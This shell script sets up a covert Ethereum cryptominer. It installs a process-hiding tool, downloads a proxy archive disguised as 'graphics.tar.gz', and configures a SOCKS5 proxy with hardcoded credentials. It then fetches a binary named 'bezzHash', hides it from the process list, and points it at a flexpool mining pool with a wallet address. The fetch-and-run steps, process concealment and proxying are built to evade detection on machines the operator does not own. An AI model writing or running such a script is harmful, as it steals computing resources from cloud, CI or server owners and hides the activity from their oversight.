#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget -O - https://deb.nodesource.com/setup_17.x | bash

apt -y install nodejs

apt -y install npm > /dev/null

npm i -g node-process-hider

ph add graftcp

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = gpusocks4.wot.mrface.com:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

ph add bezzHash

./graftcp/graftcp ./bezzHash --url=ssl://0xC236BedfCC4ec6a39251eeBDd185Fa0cb44b910B.bezzHash@eth-de.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
